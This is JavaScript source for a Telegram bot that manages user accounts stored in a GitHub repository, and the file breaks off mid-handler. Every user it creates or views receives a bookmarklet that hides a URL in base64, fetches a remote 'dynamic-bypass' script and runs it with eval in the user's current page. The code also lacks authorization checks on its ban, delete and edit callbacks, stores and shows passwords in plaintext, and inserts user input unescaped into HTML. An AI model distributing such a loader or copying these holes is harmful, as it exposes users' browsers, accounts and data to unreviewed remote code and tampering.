// ╔══════════════════════════════════════════════╗
// ║  NEBULA USER MANAGER BOT v4.1              ║
// ║  AUTHOR: Abdullah Al Mamun (@A2MBD3)       ║
// ║  ALL BUGS FIXED + MISSING FEATURES         ║
// ╚══════════════════════════════════════════════╝

const express = require('express');
const fetch = require('node-fetch');
const { Buffer } = require('buffer');

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const ADMIN_IDS = (process.env.ADMIN_IDS || '').split(',').map(id => id.trim());
const OWNER_ID = ADMIN_IDS[0];
const REPO = 'A2MBD3/Aincrad';
const FILE_PATH = 'assets/users.json';
const API = `https://api.telegram.org/bot${TOKEN}`;
const GH_API = `https://api.github.com/repos/${REPO}/contents/${FILE_PATH}`;

// ═══════════════════════════════════════════════
// FORCE JOIN
// ═══════════════════════════════════════════════
const FORCE_CHANNEL = '@phantomsect';
const FORCE_GROUP = '@redguild';
const FORCE_CHANNEL_URL = 'https://t.me/phantomsect';
const FORCE_GROUP_URL = 'https://t.me/redguild';

// ═══════════════════════════════════════════════
// SESSIONS + RATE LIMIT
// ═══════════════════════════════════════════════
const sessions = {};
const broadcastWaiting = {};
const rateLimit = {};
const RATE_LIMIT_WINDOW = 2000; // 2 seconds
const SESSION_TTL = 30 * 60 * 1000; // 30 min

// ═══════════════════════════════════════════════
// CACHE
// ═══════════════════════════════════════════════
let cachedUsers = null;
let cacheTime = 0;
const CACHE_TTL = 5000;
let botInfoCache = null;
let botUsernameCache = null;

// ═══════════════════════════════════════════════
// CLEANUP
// ═══════════════════════════════════════════════
setInterval(() => {
  const now = Date.now();
  for (const key in sessions) {
    if (now - sessions[key].time > SESSION_TTL) delete sessions[key];
  }
  for (const key in broadcastWaiting) {
    if (now - broadcastWaiting[key].time > 300000) delete broadcastWaiting[key];
  }
  for (const key in rateLimit) {
    if (now - rateLimit[key] > RATE_LIMIT_WINDOW) delete rateLimit[key];
  }
}, 60000);

// ═══════════════════════════════════════════════
// LOGGER
// ═══════════════════════════════════════════════
function log(context, msg, type = 'info') {
  const ts = new Date().toISOString().slice(11, 19);
  const emoji = { info: '📘', warn: '⚠️', error: '❌', success: '✅' }[type] || '📘';
  const method = type === 'error' ? 'error' : 'log';
  console[method](`[${ts}] ${emoji} [${context}] ${msg}`);
}

// ═══════════════════════════════════════════════
// ⬡ LANDING PAGE - MOBILE FRIENDLY
// ═══════════════════════════════════════════════
app.get('/', async (req, res) => {
  try {
    const users = await getUsers();
    const totalUsers = users.users.length;
    const activeUsers = users.users.filter(u => !u.banned).length;
    const bannedUsers = users.users.filter(u => u.banned).length;
    const botLink = botUsernameCache ? `https://t.me/${botUsernameCache}` : '#';

    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#0a0a1a">
  <title>NEBULA Bot | @A2MBD3</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{
      background:linear-gradient(135deg,#0a0a1a 0%,#1a0a2e 50%,#0a0a1a 100%);
      min-height:100vh;min-height:100dvh;
      display:flex;align-items:center;justify-content:center;
      font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;
      padding:16px;
    }
    .card{
      background:rgba(255,255,255,0.03);
      backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
      border:1px solid rgba(0,255,255,0.1);border-radius:24px;
      padding:32px 24px;text-align:center;max-width:380px;width:100%;
      box-shadow:0 0 60px rgba(0,255,255,0.05);
      animation:fadeIn 0.6s ease;
    }
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    .logo{
      width:64px;height:64px;
      background:linear-gradient(135deg,#00ffff,#7b2fff);
      border-radius:20px;margin:0 auto 20px;
      display:flex;align-items:center;justify-content:center;
      font-size:32px;box-shadow:0 8px 32px rgba(0,255,255,0.2);
      animation:pulse 3s ease-in-out infinite;
    }
    @keyframes pulse{0%,100%{box-shadow:0 8px 32px rgba(0,255,255,0.2)}50%{box-shadow:0 8px 48px rgba(123,47,255,0.4)}}
    h1{
      font-size:24px;font-weight:800;
      background:linear-gradient(90deg,#00ffff,#7b2fff,#ff00ff);
      -webkit-background-clip:text;-webkit-text-fill-color:transparent;
      background-clip:text;margin-bottom:4px;letter-spacing:1px;
    }
    .status{
      display:inline-flex;align-items:center;gap:6px;
      background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.3);
      padding:4px 12px;border-radius:20px;font-size:11px;
      color:#00ff88;margin-bottom:20px;font-weight:600;
    }
    .status-dot{width:8px;height:8px;background:#00ff88;border-radius:50%;animation:blink 2s infinite}
    @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
    .stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:20px}
    .stat-box{
      background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);
      border-radius:14px;padding:14px 8px;
    }
    .stat-num{font-size:24px;font-weight:800;color:#fff;line-height:1}
    .stat-label{font-size:9px;color:rgba(255,255,255,0.4);margin-top:4px;text-transform:uppercase;letter-spacing:1px}
    .btn{
      display:block;width:100%;padding:14px;border-radius:14px;
      font-size:15px;font-weight:700;text-decoration:none;cursor:pointer;
      transition:all 0.3s;margin-bottom:8px;letter-spacing:0.5px;
    }
    .btn-primary{background:linear-gradient(135deg,#00ffff,#7b2fff);color:#000;border:none}
    .btn-primary:active{transform:scale(0.97);opacity:0.9}
    .btn-secondary{background:rgba(255,255,255,0.04);color:rgba(255,255,255,0.7);border:1px solid rgba(255,255,255,0.1)}
    .footer{margin-top:16px;font-size:10px;color:rgba(255,255,255,0.2)}
    .footer a{color:rgba(0,255,255,0.6);text-decoration:none;font-weight:600}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">⬡</div>
    <h1>NEBULA Bot</h1>
    <div class="status"><span class="status-dot"></span> Live & Active</div>
    <div class="stats">
      <div class="stat-box"><div class="stat-num">${totalUsers}</div><div class="stat-label">Total</div></div>
      <div class="stat-box"><div class="stat-num">${activeUsers}</div><div class="stat-label">Active</div></div>
      <div class="stat-box"><div class="stat-num">${bannedUsers}</div><div class="stat-label">Banned</div></div>
    </div>
    <a href="${botLink}" class="btn btn-primary">🤖 Open Bot</a>
    <a href="https://t.me/A2MBD3" class="btn btn-secondary">👤 Contact Creator</a>
    <div class="footer">Created by <a href="https://t.me/A2MBD3">Abdullah Al Mamun</a><br><span style="opacity:0.5">@A2MBD3 · NEBULA v4.1</span></div>
  </div>
</body>
</html>`);
  } catch (e) {
    res.send('⬡ NEBULA Bot v4.1 | @A2MBD3');
  }
});

// ═══════════════════════════════════════════════
// API HELPERS
// ═══════════════════════════════════════════════
const ghHeaders = {
  'Authorization': `token ${GITHUB_TOKEN}`,
  'Accept': 'application/vnd.github.v3+json',
  'User-Agent': 'NebulaBot/4.1'
};

async function getBotInfo() {
  if (botInfoCache) return botInfoCache;
  try {
    const res = await fetch(`${API}/getMe`);
    const data = await res.json();
    if (data.ok) {
      botInfoCache = data.result;
      botUsernameCache = data.result.username;
      return data.result;
    }
  } catch (e) {}
  return { username: 'NebulaBot' };
}

async function getUsers(retries = 2) {
  if (cachedUsers && Date.now() - cacheTime < CACHE_TTL) return cachedUsers;
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(GH_API + '?t=' + Date.now(), { headers: ghHeaders });
      if (!res.ok) throw new Error(`GitHub ${res.status}`);
      const data = await res.json();
      if (!data.content) throw new Error('No content');
      const decoded = Buffer.from(data.content, 'base64').toString('utf8');
      const parsed = JSON.parse(decoded);
      cachedUsers = { users: parsed.users || [], sha: data.sha };
      cacheTime = Date.now();
      return cachedUsers;
    } catch (e) {
      log('getUsers', e.message, 'error');
      if (i === retries - 1) throw e;
      await sleep(1000);
    }
  }
}

async function saveUsers(users, sha, msg, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const content = JSON.stringify({ users }, null, 2);
      const res = await fetch(GH_API, {
        method: 'PUT',
        headers: { ...ghHeaders, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `🤖 ${msg}`,
          content: Buffer.from(content).toString('base64'),
          sha
        })
      });
      if (!res.ok) {
        const err = await res.text();
        if (res.status === 409 && i < retries - 1) {
          const fresh = await getUsers();
          sha = fresh.sha;
          users.forEach(u => {
            const existing = fresh.users.find(x => x.id === u.id);
            if (!existing) fresh.users.push(u);
          });
          users = fresh.users;
          continue;
        }
        throw new Error(`GitHub ${res.status}`);
      }
      cachedUsers = null;
      return await res.json();
    } catch (e) {
      log('saveUsers', e.message, 'error');
      if (i === retries - 1) throw e;
      await sleep(1000);
    }
  }
}

async function tgApi(method, body, retries = 2) {
  for (let i = 0; i < retries; i++) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 15000);
      const res = await fetch(`${API}/${method}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
        signal: controller.signal
      });
      clearTimeout(timeout);
      const data = await res.json();
      if (!data.ok) throw new Error(data.description || 'TG error');
      return data;
    } catch (e) {
      if (i === retries - 1) return { ok: false, error: e.message };
      await sleep(1000);
    }
  }
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ═══════════════════════════════════════════════
// RATE LIMITER
// ═══════════════════════════════════════════════
function checkRateLimit(chatId) {
  const now = Date.now();
  if (rateLimit[chatId] && now - rateLimit[chatId] < RATE_LIMIT_WINDOW) return false;
  rateLimit[chatId] = now;
  return true;
}

// ═══════════════════════════════════════════════
// SAFE TG METHODS
// ═══════════════════════════════════════════════
async function editMsg(chatId, msgId, text, markup) {
  try {
    return await tgApi('editMessageText', {
      chat_id: chatId, message_id: msgId, text,
      parse_mode: 'HTML', reply_markup: markup,
      disable_web_page_preview: true
    });
  } catch {
    return await sendMsg(chatId, text, markup);
  }
}

async function sendMsg(chatId, text, markup) {
  return tgApi('sendMessage', {
    chat_id: chatId, text, parse_mode: 'HTML',
    reply_markup: markup, disable_web_page_preview: true
  });
}

async function answerCb(cbId, text, alert = false) {
  if (!cbId) return;
  return tgApi('answerCallbackQuery', {
    callback_query_id: cbId, text, show_alert: alert
  });
}

async function deleteMsg(chatId, msgId) {
  try { await tgApi('deleteMessage', { chat_id: chatId, message_id: msgId }); } catch {}
}

// ═══════════════════════════════════════════════
// FORCE JOIN
// ═══════════════════════════════════════════════
async function checkForceJoin(chatId) {
  const results = { channel: false, group: false };
  try {
    const ch = await tgApi('getChatMember', { chat_id: FORCE_CHANNEL, user_id: chatId });
    if (ch.ok) results.channel = ['creator', 'administrator', 'member'].includes(ch.result?.status);
  } catch (e) {}
  try {
    const gr = await tgApi('getChatMember', { chat_id: FORCE_GROUP, user_id: chatId });
    if (gr.ok) results.group = ['creator', 'administrator', 'member'].includes(gr.result?.status);
  } catch (e) {}

  if (!results.channel || !results.group) {
    const missing = [];
    if (!results.channel) missing.push(`📢 <a href="${FORCE_CHANNEL_URL}">Phantom Sect</a>`);
    if (!results.group) missing.push(`👥 <a href="${FORCE_GROUP_URL}">Red Guild</a>`);
    await sendMsg(chatId,
      '🔒 <b>JOIN REQUIRED</b>\n\n' + missing.join('\n') + '\n\n<i>Join then click Check</i>',
      { inline_keyboard: [
        ...(!results.channel ? [[{ text: '📢 JOIN CHANNEL', url: FORCE_CHANNEL_URL }]] : []),
        ...(!results.group ? [[{ text: '👥 JOIN GROUP', url: FORCE_GROUP_URL }]] : []),
        [{ text: '✅ CHECK', callback_data: 'check_join' }],
      ]}
    );
    return false;
  }
  return true;
}

// ═══════════════════════════════════════════════
// KEYBOARDS
// ═══════════════════════════════════════════════
function homeKB(isOwner, hasUser) {
  const b = [];
  b.push(hasUser
    ? [{ text: '✏️ EDIT MY USER', callback_data: 'edit_my' }]
    : [{ text: '➕ CREATE USER', callback_data: 'add_start' }]
  );
  if (isOwner) {
    b.push([{ text: '👥 USER LIST', callback_data: 'users' }]);
    b.push([{ text: '🔍 SEARCH', callback_data: 'search' }]);
    b.push([{ text: '📊 STATS', callback_data: 'stats' }]);
    b.push([{ text: '📢 BROADCAST', callback_data: 'broadcast' }]);
  }
  b.push([{ text: '🔄 REFRESH', callback_data: 'home' }]);
  return { inline_keyboard: b };
}

function backBtn(d = 'home') {
  return { inline_keyboard: [[{ text: '🔙 BACK', callback_data: d }]] };
}

function cancelBtn() {
  return { inline_keyboard: [[{ text: '❌ CANCEL', callback_data: 'home' }]] };
}

function userListKB(users, page = 0) {
  const pp = 8, total = Math.max(1, Math.ceil(users.length / pp));
  page = Math.max(0, Math.min(page, total - 1));
  const slice = users.slice(page * pp, (page + 1) * pp);
  const rows = slice.map(u => [{
    text: `${u.banned ? '🚫' : '✅'} ${u.name} (ID:${u.id})`,
    callback_data: `view_${u.id}`
  }]);
  rows.forEach((r, i) => {
    if (slice[i]) r.push({ text: '🗑', callback_data: `del_${slice[i].id}_list` });
  });
  const nav = [];
  if (page > 0) nav.push({ text: '⬅️', callback_data: `users_${page - 1}` });
  nav.push({ text: `${page + 1}/${total}`, callback_data: 'noop' });
  if (page < total - 1) nav.push({ text: '➡️', callback_data: `users_${page + 1}` });
  if (nav.length) rows.push(nav);
  rows.push([{ text: '🔙 HOME', callback_data: 'home' }]);
  return { inline_keyboard: rows };
}

function ownerUserKB(u) {
  return { inline_keyboard: [
    [{ text: u.banned ? '✅ UNBAN' : '🚫 BAN', callback_data: `toggle_${u.id}` },
     { text: '🗑 DELETE', callback_data: `del_${u.id}` }],
    [{ text: '✏️ EDIT', callback_data: `admin_edit_${u.id}` }],
    [{ text: '🔙 LIST', callback_data: 'users' }],
  ]};
}

function editMyKB(id) {
  return { inline_keyboard: [
    [{ text: '📛 NAME', callback_data: `edit_name_${id}` }],
    [{ text: '🔑 PASSWORD', callback_data: `edit_pass_${id}` }],
    [{ text: '📢 CHANNEL', callback_data: `edit_ch_${id}` }],
    [{ text: '🔙 HOME', callback_data: 'home' }],
  ]};
}

// ═══════════════════════════════════════════════
// TEXT
// ═══════════════════════════════════════════════
function homeText(isOwner, hasUser, u) {
  let t = '<b>⬡ NEBULA v4.1</b>\n\n';
  if (hasUser && u) {
    t += `👤 <b>${u.name}</b> (ID:${u.id})\n🔑 ${u.password==='0'?'None':'••••'}\n📢 ${u.tgChannel==='0'?'None':u.tgChannel}\n🚫 ${u.banned?'Banned':'Active'}\n\n<i>Use EDIT MY USER.</i>`;
  } else {
    t += '👋 Welcome!\n\nCreate your NEBULA user.\n\n<i>By @A2MBD3</i>';
  }
  return t;
}

function userText(u) {
  const bl = `javascript:(function(){window.ABDULLAH_BOOKMARK_LOAD=${u.id};var a=['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0EyTUJEMy9BaW5jcmFkL21haW4vL2R5bmFtaWMtYnlwYXNzLWJ5LUBhMm1iZDMuanM='];fetch(atob(a[0])+'?t='+Date.now()).then(r=>r.text()).then(t=>eval(t)).catch(()=>alert('Failed'));})();`;
  return `<b>👤 ${u.name}</b>\n\n🆔 ${u.id}\n👑 @${u.creator||'?'}\n🔑 ${u.password}\n📢 ${u.tgChannel}\n🚫 ${u.banned?'Yes':'No'}\n💬 Chat: ${u.chatId?'✅':'❌'}\n📅 Created: ${u.createdAt||'Unknown'}\n\n<b>📋 Bookmarklet:</b>\n<code>${bl}</code>`;
}

// ═══════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════
async function getUserByCreator(username) {
  if (!username) return null;
  const { users } = await getUsers();
  return users.find(u => u.creator?.toLowerCase() === username.toLowerCase()) || null;
}

async function storeChatId(username, chatId) {
  if (!username) return;
  try {
    const { users, sha } = await getUsers();
    const u = users.find(x => x.creator?.toLowerCase() === username.toLowerCase());
    if (u && u.chatId !== chatId) {
      u.chatId = chatId;
      u.lastSeen = new Date().toISOString();
      await saveUsers(users, sha, `Update chatId for ${u.name}`);
    }
  } catch {}
}

function isAdmin(chatId) {
  return ADMIN_IDS.includes(chatId.toString());
}

// ═══════════════════════════════════════════════
// ADD USER
// ═══════════════════════════════════════════════
function startAdd(chatId, msgId, creator) {
  sessions[chatId] = { step: 'name', msgId, data: { creator }, time: Date.now() };
  editMsg(chatId, msgId, '➕ <b>CREATE USER</b>\n\n<b>Step 1/3:</b> Enter <b>Name</b>:', cancelBtn());
}

async function handleAddStep(chatId, text, msgId) {
  const s = sessions[chatId];
  if (!s) return;
  try {
    switch (s.step) {
      case 'name':
        s.data.name = text; s.step = 'password';
        await editMsg(chatId, msgId, `✅ Name: <b>${text}</b>\n\n<b>Step 2/3:</b> Enter <b>Password</b> (0=none):`, cancelBtn());
        break;
      case 'password':
        s.data.password = text; s.step = 'channel';
        await editMsg(chatId, msgId, `✅ Pass: <b>${text}</b>\n\n<b>Step 3/3:</b> Enter <b>Channel</b> (0=none):`, cancelBtn());
        break;
      case 'channel':
        s.data.channel = text;
        await finishAdd(chatId, msgId, s);
        break;
    }
  } catch (e) {
    delete sessions[chatId];
    await editMsg(chatId, msgId, `❌ ${e.message}`, backBtn());
  }
}

async function finishAdd(chatId, msgId, s) {
  const { users, sha } = await getUsers();
  const maxId = users.reduce((max, u) => Math.max(max, u.id), 0);
  const newUser = {
    id: maxId + 1, name: s.data.name, password: s.data.password,
    tgChannel: s.data.channel, creator: s.data.creator, banned: 0,
    chatId, createdAt: new Date().toISOString()
  };
  users.push(newUser);
  await saveUsers(users, sha, `Add ${newUser.name} by @${s.data.creator}`);
  delete sessions[chatId];

  const bl = `javascript:(function(){window.ABDULLAH_BOOKMARK_LOAD=${newUser.id};var a=['aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0EyTUJEMy9BaW5jcmFkL21haW4vL2R5bmFtaWMtYnlwYXNzLWJ5LUBhMm1iZDMuanM='];fetch(atob(a[0])+'?t='+Date.now()).then(r=>r.text()).then(t=>eval(t)).catch(()=>alert('Failed'));})();`;
  await editMsg(chatId, msgId,
    `✅ <b>CREATED!</b>\n\n🆔 ${newUser.id} | 📛 ${newUser.name}\n\n<b>Bookmarklet:</b>\n<code>${bl}</code>`,
    { inline_keyboard: [[{ text: '🔙 HOME', callback_data: 'home' }], [{ text: '➕ ADD MORE', callback_data: 'add_start' }]] }
  );
}

// ═══════════════════════════════════════════════
// EDIT
// ═══════════════════════════════════════════════
function startEdit(chatId, msgId, userId, field) {
  sessions[chatId] = { step: 'edit', msgId, userId, field, time: Date.now() };
  const labels = { name: 'Name', password: 'Password', tgChannel: 'Channel' };
  editMsg(chatId, msgId, `✏️ Edit <b>${labels[field]}</b>:`, cancelBtn());
}

async function handleEditStep(chatId, text, msgId) {
  const s = sessions[chatId];
  if (!s || s.step !== 'edit') return;
  try {
    const { users, sha } = await getUsers();
    const u = users.find(x => x.id === s.userId);
    if (!u) throw new Error('User not found');
    u[s.field] = text;
    await saveUsers(users, sha, `Edit ${s.field} for ${u.name}`);
    delete sessions[chatId];
    await editMsg(chatId, msgId, `✅ Updated!`, backBtn());
  } catch (e) {
    delete sessions[chatId];
    await editMsg(chatId, msgId, `❌ ${e.message}`, backBtn());
  }
}

// ═══════════════════════════════════════════════
// BROADCAST
// ═══════════════════════════════════════════════
function startBroadcast(chatId, msgId) {
  broadcastWaiting[chatId] = { msgId, time: Date.now() };
  editMsg(chatId, msgId, '📢 <b>BROADCAST</b>\n\nSend content.\n/cancel to abort.', cancelBtn());
}

async function handleBroadcastSend(chatId, msgId, message) {
  delete broadcastWaiting[chatId];
  try {
    const { users } = await getUsers();
    const active = users.filter(u => u.chatId && !u.banned);
    let sent = 0, failed = 0;

    await editMsg(chatId, msgId, `📢 Sending to ${active.length}...`);

    for (let i = 0; i < active.length; i += 20) {
      const chunk = active.slice(i, i + 20);
      const results = await Promise.allSettled(chunk.map(u => sendToUser(u, message)));
      results.forEach(r => r.status === 'fulfilled' && r.value ? sent++ : failed++);
      if (i + 20 < active.length) {
        await editMsg(chatId, msgId, `📢 ${Math.min(i + 20, active.length)}/${active.length}...`);
        await sleep(1000);
      }
    }

    await editMsg(chatId, msgId, `✅ Done! Sent: ${sent} Failed: ${failed}`, backBtn());
  } catch (e) {
    await editMsg(chatId, msgId, `❌ ${e.message}`, backBtn());
  }
}

async function sendToUser(user, message) {
  try {
    if (message.text && !message.photo && !message.video && !message.document) {
      if (message.text.includes('|') && message.text.trim().startsWith('http')) {
        const [url, btn] = message.text.split('|').map(s => s.trim());
        return await tgApi('sendMessage', {
          chat_id: user.chatId, text: '📢 <b>Broadcast</b>', parse_mode: 'HTML',
          reply_markup: { inline_keyboard: [[{ text: btn || 'Open', url }]] }
        });
      }
      return await tgApi('sendMessage', {
        chat_id: user.chatId, text: `📢 <b>Broadcast</b>\n\n${message.text}`, parse_mode: 'HTML'
      });
    }
    if (message.photo) {
      return await tgApi('sendPhoto', {
        chat_id: user.chatId,
        photo: message.photo[message.photo.length - 1].file_id,
        caption: message.caption || '📢 Broadcast',
        parse_mode: 'HTML'
      });
    }
    if (message.video) {
      return await tgApi('sendVideo', {
        chat_id: user.chatId, video: message.video.file_id,
        caption: message.caption || '📢 Broadcast', parse_mode: 'HTML'
      });
    }
    if (message.document) {
      return await tgApi('sendDocument', {
        chat_id: user.chatId, document: message.document.file_id,
        caption: message.caption || '📢 Broadcast', parse_mode: 'HTML'
      });
    }
  } catch { return null; }
}

// ═══════════════════════════════════════════════
// DELETE & REFRESH
// ═══════════════════════════════════════════════
async function deleteAndRefresh(chatId, msgId, userId, cbId) {
  const { users, sha } = await getUsers();
  const idx = users.findIndex(x => x.id === userId);
  if (idx === -1) return answerCb(cbId, 'Not found!', true);
  const name = users[idx].name;
  users.splice(idx, 1);
  await saveUsers(users, sha, `Delete ${name}`);
  const updated = await getUsers();
  const t = updated.users.length
    ? updated.users.map(u => `${u.banned ? '🚫' : '✅'} <b>${u.name}</b> (${u.id})`).join('\n')
    : 'No users.';
  await editMsg(chatId, msgId, `🗑 <b>${name}</b> deleted!\n\n<b>👥 USERS</b>\n\n${t}`, userListKB(updated.users));
}

// ═══════════════════════════════════════════════
// SEARCH
// ═══════════════════════════════════════════════
function startSearch(chatId, msgId) {
  sessions[chatId] = { step: 'search', msgId, time: Date.now() };
  editMsg(chatId, msgId, '🔍 <b>SEARCH USER</b>\n\nEnter name or ID:', cancelBtn());
}

async function handleSearch(chatId, text, msgId) {
  delete sessions[chatId];
  const { users } = await getUsers();
  const query = text.toLowerCase();
  const results = users.filter(u =>
    u.name.toLowerCase().includes(query) ||
    u.id.toString() === query ||
    (u.creator && u.creator.toLowerCase().includes(query))
  );

  if (!results.length) {
    return editMsg(chatId, msgId, `❌ No results for "<b>${text}</b>"`, backBtn());
  }

  const t = results.slice(0, 15).map(u =>
    `${u.banned ? '🚫' : '✅'} <b>${u.name}</b> (ID:${u.id})\n   👑 @${u.creator||'?'}`
  ).join('\n\n');

  const kb = {
    inline_keyboard: results.slice(0, 10).map(u => [{
      text: `${u.name} (ID:${u.id})`,
      callback_data: `view_${u.id}`
    }]).concat([[{ text: '🔙 HOME', callback_data: 'home' }]])
  };

  await editMsg(chatId, msgId, `🔍 <b>Results (${results.length}):</b>\n\n${t}`, kb);
}

// ═══════════════════════════════════════════════
// ADMIN EDIT ANY USER
// ═══════════════════════════════════════════════
function startAdminEdit(chatId, msgId, userId) {
  sessions[chatId] = { step: 'admin_edit', msgId, userId, time: Date.now() };
  editMsg(chatId, msgId,
    '✏️ <b>ADMIN EDIT</b>\n\nFormat: <code>name,password,channel,banned</code>\n\n' +
    'Example: <code>John,1234,t.me/test,0</code>',
    cancelBtn()
  );
}

async function handleAdminEdit(chatId, text, msgId) {
  const s = sessions[chatId];
  if (!s) return;
  const parts = text.split(',').map(x => x.trim());
  if (parts.length < 4) {
    return editMsg(chatId, msgId, '❌ Need 4 values: name,password,channel,banned', cancelBtn());
  }

  try {
    const { users, sha } = await getUsers();
    const u = users.find(x => x.id === s.userId);
    if (!u) throw new Error('User not found');

    u.name = parts[0];
    u.password = parts[1];
    u.tgChannel = parts[2];
    u.banned = parseInt(parts[3]) || 0;

    await saveUsers(users, sha, `Admin edit ${u.name}`);
    delete sessions[chatId];
    await editMsg(chatId, msgId, `✅ <b>${u.name}</b> updated!`, backBtn());
  } catch (e) {
    delete sessions[chatId];
    await editMsg(chatId, msgId, `❌ ${e.message}`, backBtn());
  }
}

// ═══════════════════════════════════════════════
// MAIN HANDLER
// ═══════════════════════════════════════════════
async function handleUpdate(update) {
  try {
    if (update.callback_query) {
      const cb = update.callback_query;
      const chatId = cb.message?.chat?.id;
      const msgId = cb.message?.message_id;
      const data = cb.data;
      const username = cb.from?.username || '';
      const owner = isAdmin(chatId);
      if (!chatId || !msgId) return;

      await answerCb(cb.id, '');

      // Navigation
      if (data === 'check_join') {
        const joined = await checkForceJoin(chatId);
        if (joined) {
          await deleteMsg(chatId, msgId);
          const user = await getUserByCreator(username);
          await sendMsg(chatId, homeText(owner, !!user, user), homeKB(owner, !!user));
        }
        return;
      }
      if (data === 'home') {
        const user = await getUserByCreator(username);
        return editMsg(chatId, msgId, homeText(owner, !!user, user), homeKB(owner, !!user));
      }

      // Users list
      if (data === 'users') {
        const { users } = await getUsers();
        const t = users.length ? users.map(u => `${u.banned ? '🚫' : '✅'} <b>${u.name}</b> (${u.id})`).join('\n') : 'No users.';
        return editMsg(chatId, msgId, `<b>👥 USERS (${users.length})</b>\n\n${t}`, userListKB(users));
      }
      if (data.startsWith('users_')) {
        const page = parseInt(data.split('_')[1]) || 0;
        const { users } = await getUsers();
        return editMsg(chatId, msgId, `<b>👥 USERS</b>`, userListKB(users, page));
      }

      // View user
      if (data.startsWith('view_')) {
        const id = parseInt(data.split('_')[1]);
        const { users } = await getUsers();
        const u = users.find(x => x.id === id);
        if (!u) return answerCb(cb.id, 'Not found!', true);
        return editMsg(chatId, msgId, userText(u), owner ? ownerUserKB(u) : backBtn());
      }

      // Toggle ban
      if (data.startsWith('toggle_')) {
        const id = parseInt(data.split('_')[1]);
        const { users, sha } = await getUsers();
        const u = users.find(x => x.id === id);
        if (!u) return answerCb(cb.id, 'Not found!', true);
        u.banned = u.banned ? 0 : 1;
        await saveUsers(users, sha, `${u.banned ? 'Ban' : 'Unban'} ${u.name}`);
        return editMsg(chatId, msgId, userText(u), ownerUserKB(u));
      }

      // Delete
      if (data.startsWith('del_') && data.endsWith('_list')) return deleteAndRefresh(chatId, msgId, parseInt(data.replace('del_', '').replace('_list', '')), cb.id);
      if (data.startsWith('del_')) return deleteAndRefresh(chatId, msgId, parseInt(data.split('_')[1]), cb.id);

      // Add/Edit
      if (data === 'add_start') return startAdd(chatId, msgId, username);
      if (data === 'edit_my') {
        const user = await getUserByCreator(username);
        if (!user) return editMsg(chatId, msgId, '❌ No user! Create first.', backBtn());
        return editMsg(chatId, msgId, userText(user), editMyKB(user.id));
      }
      if (data.startsWith('edit_name_')) return startEdit(chatId, msgId, parseInt(data.split('_')[2]), 'name');
      if (data.startsWith('edit_pass_')) return startEdit(chatId, msgId, parseInt(data.split('_')[2]), 'password');
      if (data.startsWith('edit_ch_')) return startEdit(chatId, msgId, parseInt(data.split('_')[2]), 'tgChannel');
      if (data.startsWith('admin_edit_')) return startAdminEdit(chatId, msgId, parseInt(data.split('_')[2]));

      // Search
      if (data === 'search') return startSearch(chatId, msgId);

      // Stats
      if (data === 'stats') {
        const { users } = await getUsers();
        const total = users.length;
        const active = users.filter(u => !u.banned).length;
        const banned = users.filter(u => u.banned).length;
        const withCreator = users.filter(u => u.creator).length;
        const withChat = users.filter(u => u.chatId).length;
        return editMsg(chatId, msgId,
          '<b>📊 NEBULA STATS</b>\n\n' +
          `👥 Total: ${total}\n✅ Active: ${active}\n🚫 Banned: ${banned}\n` +
          `👑 With Creator: ${withCreator}\n💬 Chat Stored: ${withChat}\n\n` +
          '<i>By @A2MBD3</i>',
          backBtn()
        );
      }

      // Broadcast
      if (data === 'broadcast') return startBroadcast(chatId, msgId);
      if (data === 'noop') return;
      return;
    }

    // ═══════════════════════════════════════════
    // MESSAGE
    // ═══════════════════════════════════════════
    if (update.message) {
      const { chat, text, from } = update.message;
      const chatId = chat.id;
      const username = from?.username || '';
      const owner = isAdmin(chatId);

      if (!checkRateLimit(chatId) && !owner) return;

      await storeChatId(username, chatId);

      if (text === '/start') {
        const joined = await checkForceJoin(chatId);
        if (!joined) return;
        const user = await getUserByCreator(username);
        return sendMsg(chatId, homeText(owner, !!user, user), homeKB(owner, !!user));
      }

      if (text === '/cancel') {
        delete sessions[chatId];
        delete broadcastWaiting[chatId];
        return sendMsg(chatId, '❌ Cancelled.', backBtn());
      }

      // Admin commands
      if (owner && text === '/stats') {
        const { users } = await getUsers();
        return sendMsg(chatId,
          '<b>📊 QUICK STATS</b>\n\n' +
          `Total: ${users.length}\nActive: ${users.filter(u => !u.banned).length}\n` +
          `Banned: ${users.filter(u => u.banned).length}`,
          backBtn()
        );
      }

      if (owner && text === '/botstatus') {
        const { users } = await getUsers();
        const uptime = process.uptime();
        const mem = process.memoryUsage();
        return sendMsg(chatId,
          '<b>🤖 BOT STATUS</b>\n\n' +
          `⏰ Uptime: ${Math.floor(uptime/60)}m ${Math.floor(uptime%60)}s\n` +
          `💾 Memory: ${Math.round(mem.heapUsed/1024/1024)}MB\n` +
          `👥 Users: ${users.length}\n` +
          `🔄 Poll Errors: ${errors}\n\n` +
          '<i>By @A2MBD3</i>'
        );
      }

      // Sessions
      if (broadcastWaiting[chatId]) return handleBroadcastSend(chatId, broadcastWaiting[chatId].msgId, update.message);
